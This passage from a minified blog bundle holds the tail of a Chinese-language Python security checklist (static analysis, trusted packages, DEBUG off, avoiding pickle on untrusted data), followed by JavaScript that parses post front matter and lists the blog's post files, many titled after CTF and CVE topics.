- [ ]  **使用安全扫描工具检查代码**
    
    推荐使用 Bandit、pylint、flake8 或 Snyk Code 进行静态分析。
    
- [ ]  **只安装可信软件包**
    
    避免拼写陷阱（typosquatting），安装前用 Snyk Advisor 检查包的信誉。
    https://snyk.io/advisor/search?source=python&q=sentry-sdk 
    
- [ ]  **检查依赖项的许可证合规性**
    
    确保开源依赖满足公司或项目的许可要求（如 GPL、MIT、Apache 等）。
    
- [ ]  **避免使用系统默认 Python 版本**
    
    使用最新版官方 Python，并确保定期更新。
    
- [ ]  **使用虚拟环境隔离依赖**
    
    如 \`python -m venv venv\`，避免全局包污染和依赖冲突。
    
- [ ]  **生产环境关闭调试模式**
    
    \`DEBUG = False\`，防止泄露堆栈信息或配置。
    
- [ ]  **避免不安全的字符串格式化**
    
    不用 \`%\` 或 \`.format()\` 处理用户输入，推荐 \`string.Template\` 或 f-string 并控制输入来源。
    
- [ ]  **安全地处理序列化/反序列化**
    
    不使用 \`pickle\` 处理不可信数据，改用 \`yaml.safe_load\` 或 \`defusedxml\` 等安全模块。
    
- [ ]  **使用类型注解提升代码质量**
    
    支持静态分析，减少逻辑错误1。
`;function Ze(n){const e=n.match(/(\d{4}-\d{2}-\d{2})/);return e?e[1]:""}function nt(n){const e=n.replace(/\.md$/,""),t=e.replace(/^\d{4}-\d{2}-\d{2}-/,"");return t===e?e:t.split("-").map(i=>i.charAt(0).toUpperCase()+i.slice(1)).join(" ")}function et(n){const e=/^---\s*\n([\s\S]*?)\n---\s*\n([\s\S]*)$/,t=n.match(e);if(!t)return{data:{},content:n};const[,i,r]=t,o={};return i.split(`
`).forEach(l=>{const a=l.trim();if(!a||a.startsWith("#"))return;const A=a.indexOf(":");if(A===-1)return;const c=a.slice(0,A).trim();let s=a.slice(A+1).trim();if((s.startsWith('"')&&s.endsWith('"')||s.startsWith("'")&&s.endsWith("'"))&&(s=s.slice(1,-1)),s.startsWith("[")&&s.endsWith("]")){const m=s.slice(1,-1);o[c]=m.split(",").map(p=>p.trim().replace(/^["']|["']$/g,"")).filter(p=>p.length>0)}else s==="true"?o[c]=!0:s==="false"?o[c]=!1:o[c]=s}),{data:o,content:r}}const tt=Object.assign({"../../content/_posts/2023/AIsecurity.md":h,"../../content/_posts/2023/APACHE_CVE-2021-40438-SSRF漏洞分析复现.md":g,"../../content/_posts/2023/APP渗透测试.md":u,"../../content/_posts/2023/Alert.md":_,"../../content/_posts/2023/Athena.md":S,"../../content/_posts/2023/Axlle-back.md":b,"../../content/_posts/2023/Axlle.md":v,"../../content/_posts/2023/CVE-2020-1938.md":f,"../../content/_posts/2023/CobalStrike.md":w,"../../content/_posts/2023/FTPLoginEnumerationAttackAnalysis.md":P,"../../content/_posts/2023/GoldenEye.md":T,"../../content/_posts/2023/HTB-Certified.md":y,"../../content/_posts/2023/HackTheBox University.md":C,"../../content/_posts/2023/LLM-attack.md":x,"../../content/_posts/2023/Linux服务器取证.md":E,"../../content/_posts/2023/Mimikatz.md":k,"../../content/_posts/2023/Network-packet-captures.md":L,"../../content/_posts/2023/OA利用工具.md":I,"../../content/_posts/2023/U.A.-High-School copy.md":D,"../../content/_posts/2023/U.A.-High-School.md":M,"../../content/_posts/2023/Vue-Cook.md":N,"../../content/_posts/2023/WindowsActivate.md":R,"../../content/_posts/2023/XSS—BP.md":F,"../../content/_posts/2023/advancedsqlinjection.md":O,"../../content/_posts/2023/ai-and-sec.md":U,"../../content/_posts/2023/anonymous.md":H,"../../content/_posts/2023/bookstoreoc.md":B,"../../content/_posts/2023/breakme.md":W,"../../content/_posts/2023/buuoj-easy-re.md":$,"../../content/_posts/2023/chess.md":G,"../../content/_posts/2023/creative.md":j,"../../content/_posts/2023/dailybugle.md":V,"../../content/_posts/2023/demo-enhanced-features.md":Q,"../../content/_posts/2023/demo.md":"","../../content/_posts/2023/dogcat.md":z,"../../content/_posts/2023/enterprise.md":q,"../../content/_posts/2023/fyneApp的创建.md":K,"../../content/_posts/2023/gatekeeper.md":X,"../../content/_posts/2023/how_to_info_gather.md":J,"../../content/_posts/2023/htb-nocturnal.md":Y,"../../content/_posts/2023/inferno.md":Z,"../../content/_posts/2023/insecuredeserialisation.md":nn,"../../content/_posts/2023/internal.md":en,"../../content/_posts/2023/k8sbestsecuritypractices.md":tn,"../../content/_posts/2023/lantern.md":sn,"../../content/_posts/2023/linprivesc.md":on,"../../content/_posts/2023/nahamstore.md":an,"../../content/_posts/2023/nax.md":rn,"../../content/_posts/2023/nuclei-Poc编写.md":cn,"../../content/_posts/2023/planning-htb.md":ln,"../../content/_posts/2023/ra.md":An,"../../content/_posts/2023/relevant.md":pn,"../../content/_posts/2023/road.md":dn,"../../content/_posts/2023/solr 代码执行 (CVE-2019-12409).md":mn,"../../content/_posts/2023/text2shell.md":hn,"../../content/_posts/2023/thm-nax.md":gn,"../../content/_posts/2023/tomghost.md":un,"../../content/_posts/2023/update-blog.md":_n,"../../content/_posts/2023/vulnnetendgame.md":Sn,"../../content/_posts/2023/whyhackme.md":bn,"../../content/_posts/2023/wreath.md":vn,"../../content/_posts/2023/wsl.md":fn,"../../content/_posts/2023/yotf.md":wn,"../../content/_posts/2023/学习记录.md":Pn,"../../content/_posts/2023/微信小程序渗透流程.md":Tn,"../../content/_posts/2023/想要什么.md":yn,"../../content/_posts/2023/敏感信息泄露.md":Cn,"../../content/_posts/2023/未授权用户文件上传漏洞.md":xn,"../../content/_posts/2023/漏洞挖掘注入点.md":"","../../content/_posts/2023/网络代理.md":En,"../../content/_posts/2023/胡思乱想.md":kn,"../../content/_posts/2023/解锁IP封禁.md":"","../../content/_posts/2024/2023-12-09-如何在工作中成长.md":Ln,"../../content/_posts/2024/2024-01-30-Java代码审计.md":In,"../../content/_posts/2024/2024-02-19-CVE-2022-23134.md":Dn,"../../content/_posts/2024/2024-02-20-CVE-2022-32991.md":Mn,"../../content/_posts/2024/2024-02-21-CVE-2013-2134.md":Nn,"../../content/_posts/2024/2024-02-28-twosum.md":Rn,"../../content/_posts/2024/2024-02-29-test-pass.md":Fn,"../../content/_posts/2024/2024-02-29-车联网安全面试.md":On,"../../content/_posts/2024/2024-03-01-CVE-2023-27372.md":Un,"../../content/_posts/2024/2024-03-02-CVE-2022-30887.md":Hn,"../../content/_posts/2024/2024-03-03-CVE-2014-3529.md":Bn,"../../content/_posts/2024/2024-03-04-CVE-2022-24112.md":Wn,"../../content/_posts/2024/2024-03-05-some-books-for-cs.md":$n,"../../content/_posts/2024/2024-03-05-八股文.md":Gn,"../../content/_posts/2024/2024-03-14-keep-healthy-and-optimisic.md":jn,"../../content/_posts/2024/2024-03-16-bit-sports.md":Vn,"../../content/_posts/2024/2024-03-17-softskils.md":Qn,"../../content/_posts/2024/2024-03-19-Django.md":zn,"../../content/_posts/2024/2024-03-22-如何理解python中的异步.md":qn,"../../content/_posts/2024/2024-03-31-isinstance.md":Kn,"../../content/_posts/2024/2024-04-16-PycharmCookBook.md":Xn,"../../content/_posts/2024/2024-06-23-CVE-2024-28559.md":Jn,"../../content/_posts/2024/2024-07-05-CVE-2024-36991.md":Yn,"../../content/_posts/2024/2024-07-24-ctfshow-web.md":Zn,"../../content/_posts/2024/2024-07-25-ctfshow-web9.md":ne,"../../content/_posts/2024/2024-07-26-buuoj-强网杯-2019.md":ee,"../../content/_posts/2024/2024-07-26-ctfshow-web10.md":te,"../../content/_posts/2024/2024-07-28-hackthebox-GreenHorn.md":se,"../../content/_posts/2024/2024-07-28-hackthebox-unified.md":oe,"../../content/_posts/2024/2024-07-28-weixin-passage.md":ae,"../../content/_posts/2024/2024-07-29-bussiness_logic_bug.md":ie,"../../content/_posts/2024/2024-07-29-文件包含.md":re,"../../content/_posts/2024/2024-07-31-whatissslcert.md":ce,"../../content/_posts/2024/2024-08-01-java-unserialize.md":le,"../../content/_posts/2024/2024-08-02-hack-the-box-IClean.md":Ae,"../../content/_posts/2024/2024-08-02-nssctf-[SWPUCTF-2021-新生赛]jicao.md":pe,"../../content/_posts/2024/2024-08-03-CTF-2020公开赛CHECKIN.md":de,"../../content/_posts/2024/2024-08-04-for-trust-performance.md":me,"../../content/_posts/2024/2024-08-05-code-dev.md":he,"../../content/_posts/2024/2024-08-07-CISCN-Web-Unzip.md":ge,"../../content/_posts/2024/2024-08-12-基线检查表.md":ue,"../../content/_posts/2024/2024-08-29-xctf-filter设计缺陷导致的权限绕过.md":_e,"../../content/_posts/2024/2024-09-03-BurpSuite-指南.md":Se,"../../content/_posts/2024/2024-09-03-成为赏金猎人的第一步.md":be,"../../content/_posts/2024/2024-09-04-CISCN2021-总决赛babypython.md":ve,"../../content/_posts/2024/2024-09-04-CVE-2021-44228.md":fe,"../../content/_posts/2024/2024-09-05-bypassthenextfirewall copy.md":we,"../../content/_posts/2024/2024-09-05-bypassthenextfirewall.md":Pe,"../../content/_posts/2024/2024-09-08-态势感知安全检测.md":Te,"../../content/_posts/2024/2024-09-10-安全运营.md":ye,"../../content/_posts/2024/2024-09-10-网络安全面试题.md":Ce,"../../content/_posts/2024/2024-09-12-渗透测试.md":xe,"../../content/_posts/2024/2024-09-13-端口转发.md":Ee,"../../content/_posts/2024/2024-09-16-HTTP基础.md":ke,"../../content/_posts/2024/2024-09-16-MonitorsThree-htb.md":Le,"../../content/_posts/2024/2024-09-18-windows基础.md":Ie,"../../content/_posts/2024/2024-09-19-应急响应.md":De,"../../content/_posts/2024/2024-09-21-caption.md":Me,"../../content/_posts/2024/2024-09-27-jb-crack-tools.md":Ne,"../../content/_posts/2024/2024-09-27-web中间件-tomcat.md":Re,"../../content/_posts/2024/2024-09-29-HTB-MonitorsThree-WriteUp.md":Fe,"../../content/_posts/2024/2024-10-13-JWT专题.md":Oe,"../../content/_posts/2024/2024-10-17-网络安全打靶总结.md":Ue,"../../content/_posts/2024/2024-10-20-hackthebox-Chemistry.md":He,"../../content/_posts/2024/2024-11-08-Frida-Template.md":Be,"../../content/_posts/2024/2024-11-10-VMware-QA.md":We,"../../content/_posts/2024/2024-11-12-smart_contract.md":$e,"../../content/_posts/2025/09-19-stand-workflow.md":Ge,"../../content/_posts/2025/09-19-wallet-system-design.md":je,"../../content/_posts/2025/11-27-rent-house-checklist.md":Ve,"../../content/_posts/2025/2025-09-14-burp.md":Qe,"../../content/_posts/2025/2025-09-17-Intermittent-Fasting.md":ze,"../../content/_posts/2025/2025-09-18-best-practice-output.md":qe,"../../content/_posts/2025/2025-09-19-mcpserver-pentest.md":Ke,"../../content/_posts/2025/2025-09-19-text-and-typography.md":Xe,"../../content/_posts/2025/2025-11-27-API-security-checklist.md":Je,"../../content/_posts/2025/2025-11-29-python-security.md":Ye}),d=Object.entries(tt).map(([n,e])=>{const{data:t,content:i}=et(e),r=n.split("/").pop(),o=r.replace(/\.md$/,""),l=Ze(r),a=nt(r);return{slug:o,title:t.title||a||o,date:t.date||l||"",tags:Array.isArray(t.tags)?t.tags:[],summary:t.summary||"",draft:!!t.draft,content:i}}),st=d.filter(n=>!n.draft).sort((n,e)=>n.date<e.date?1:-1),ot=n=>d.find(e=>e.slug===n);export{st as a,ot as g};
